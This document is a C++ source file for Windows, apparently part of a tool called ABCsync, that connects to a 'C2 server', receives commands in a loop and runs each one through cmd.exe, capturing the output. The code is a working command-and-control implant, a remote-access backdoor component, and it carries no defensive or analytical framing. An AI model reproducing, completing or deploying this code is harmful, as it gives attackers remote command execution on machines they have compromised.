#include "ABCsync.h"
#include <iostream>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

bool ABCsync::connectToC2(const std::string& c2Address, int port) {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[!] Failed to initialize Winsock." << std::endl;
        return false;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[!] Failed to create socket." << std::endl;
        WSACleanup();
        return false;
    }

    // Set up server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(c2Address.c_str());

    // Connect to C2 server
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "[!] Failed to connect to C2 server." << std::endl;
        closesocket(sock);
        WSACleanup();
        return false;
    }

    std::cout << "[*] Connected to C2 server." << std::endl;

    // Listen for commands from the server
    char buffer[1024];
    int bytesRead;
    while ((bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesRead] = '\0';  // Null-terminate the received data
        std::cout << "[*] Received command: " << buffer << std::endl;
        executeRemoteCommand(buffer);  // Execute the received command
    }

    closesocket(sock);
    WSACleanup();
    return true;
}

bool ABCsync::executeRemoteCommand(const std::string& command) {
    std::cout << "[*] Executing command: " << command << std::endl;

    // Use a pipe to execute the command and retrieve its output
    return executeCommand(command);
}

bool ABCsync::executeCommand(const std::string& command) {
    // Create a pipe to capture the output of the command
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdOutRead, hStdOutWrite;
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
        std::cerr << "[!] Failed to create pipe." << std::endl;
        return false;
    }

    // Ensure the read handle to the pipe is not inherited.
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // Set up the process information and start the command
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hStdOutWrite;
    siStartInfo.hStdOutput = hStdOutWrite;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Prepare the command line
    std::string cmd = "cmd.exe /c " + command;
    char cmdLine[1024];
    strncpy(cmdLine, cmd.c_str(), sizeof(cmdLine));

    // Start the child process
    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        std::cerr << "[!] Failed to execute command." << std::endl;
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return false;
    }

    // Wait for the process to finish
    WaitForSingleObject(piProcInfo.hProcess, INFINITE);

    // Read the output from the command
    DWORD bytesRead;
    char buffer[4096];
    bool success = false;
    if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        std::cout << "[*] Command output: " << buffer << std::endl;
        success = true;
    }
    else {
        std::cerr << "[!] Failed to read command output." << std::endl;
    }

    // Clean up
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);

    return success;
}
